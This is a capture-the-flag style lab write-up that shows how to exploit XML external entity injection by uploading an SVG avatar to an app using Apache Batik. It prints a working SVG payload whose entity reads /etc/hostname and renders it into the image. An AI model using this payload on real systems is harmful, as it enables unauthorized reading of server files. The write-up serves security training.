# Exploiting XXE via image upload
* This lab lets user attach avatars to comments and uses the Apache Batik library to process avatar image files.
	* To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then, use the "Submit solution" button to submit the value of the server host name.
### 1. Make a malicious SVG file to exfiltrate contents of the `/etc/hostname` file
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
### 2. Upload the created malicious SVG file to comment section as a avatar
![23](https://user-images.githubusercontent.com/53956303/152895736-e07a6d1d-ffb4-45de-af4d-d40c8b516156.png)
* The file is successfully uploaded.

![24](https://user-images.githubusercontent.com/53956303/152895810-b25ee690-c857-41c2-a4c5-ed6d6bb186e1.png)
### 3. See the result
* Go to the comment section again and right click on the avatar to use "View Image" function
	* From the result, the content of the `/etc/hostname` is stored as an image

![25](https://user-images.githubusercontent.com/53956303/152896024-de142ac4-2439-4e7c-a94f-a7f57053003d.png)
* When submit the file, the lab is solved.

![26](https://user-images.githubusercontent.com/53956303/152896063-c1dbda1f-d4e4-45dd-91b2-69a38bf6a2a0.png)
